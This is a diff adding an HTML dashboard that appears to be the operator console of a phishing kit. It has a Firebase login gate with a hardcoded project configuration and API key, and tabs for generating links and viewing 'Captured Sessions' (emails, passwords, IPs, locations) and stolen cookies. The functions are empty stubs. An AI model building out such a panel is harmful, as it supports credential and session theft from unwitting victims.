@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard</title>
+    <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-auth.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #007bff;
+            color: white;
+            padding: 15px;
+            text-align: center;
+        }
+        nav {
+            display: flex;
+            justify-content: center;
+            background-color: #f8f9fa;
+            padding: 10px 0;
+        }
+        nav button {
+            background-color: transparent;
+            border: none;
+            margin: 0 10px;
+            font-size: 16px;
+            cursor: pointer;
+            color: #007bff;
+        }
+        nav button:hover {
+            text-decoration: underline;
+        }
+        .content {
+            padding: 20px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        table, th, td {
+            border: 1px solid #ddd;
+        }
+        th, td {
+            padding: 10px;
+            text-align: left;
+        }
+        .pagination {
+            text-align: center;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Dashboard</h1>
+    </header>
+    <nav>
+        <button onclick="generateLink()">Generate Link</button>
+        <button onclick="showCapturedSessions()">Captured Sessions</button>
+        <button onclick="showCookies()">Cookies</button>
+        <button onclick="logout()">Logout</button>
+    </nav>
+    <div class="content" id="content">
+        <h2>Welcome to the Dashboard</h2>
+        <p>Select an option above to manage penetration testing data.</p>
+    </div>
+
+    <script>
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyDiNWtXm4oHQ6NpHPiLJjV4EDgU7yUQjq0",
+            authDomain: "panel-auth-134b7.firebaseapp.com",
+            projectId: "panel-auth-134b7",
+            storageBucket: "panel-auth-134b7.firebasestorage.app",
+            messagingSenderId: "892746068340",
+            appId: "1:892746068340:web:f8c4d5b798e8bc48447c21",
+        };
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+
+        auth.onAuthStateChanged((user) => {
+            if (!user) {
+                window.location.href = "index.html";
+            }
+        });
+
+        function generateLink() {
+            document.getElementById("content").innerHTML = `
+                <h2>Generate Link</h2>
+                <p>Link generated successfully!</p>
+            `;
+        }
+
+        function showCapturedSessions() {
+            document.getElementById("content").innerHTML = `
+                <h2>Captured Sessions</h2>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Email</th>
+                            <th>Password</th>
+                            <th>IP Address</th>
+                            <th>Location</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <!-- Rows populated dynamically -->
+                    </tbody>
+                </table>
+                <div class="pagination">
+                    <button>Previous</button>
+                    <button>Next</button>
+                </div>
+            `;
+        }
+
+        function showCookies() {
+            document.getElementById("content").innerHTML = `
+                <h2>Cookies</h2>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Name</th>
+                            <th>Value</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <!-- Rows populated dynamically -->
+                    </tbody>
+                </table>
+                <div class="pagination">
+                    <button>Previous</button>
+                    <button>Next</button>
+                </div>
+            `;
+        }
+
+        function logout() {
+            auth.signOut().then(() => {
+                window.location.href = "index.html";
+            });
+        }
+    </script>
+</body>
+</html>
